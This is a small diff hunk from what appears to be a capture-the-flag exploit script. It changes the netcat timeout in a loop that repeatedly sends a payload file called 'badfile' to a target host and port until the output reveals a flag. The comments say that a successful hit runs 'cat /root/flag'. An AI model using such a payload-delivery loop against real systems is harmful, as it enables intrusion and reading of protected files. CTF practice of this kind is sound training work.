@@ -24,7 +24,7 @@ trap cleanup EXIT
 
 worker() {
   while [ ! -s "$FLAGFILE" ]; do
-    out=$(cat badfile | nc -q 0 -w 2 "$TARGET" "$PORT" 2>/dev/null)
+    out=$(cat badfile | nc -q 1 -w 2 "$TARGET" "$PORT" 2>/dev/null)
     # A miss ends in "Returned Properly" (or crashes silently). A hit runs
     # `cat /root/flag` and never returns -> strip every known banner line and
     # whatever text is left is the flag.
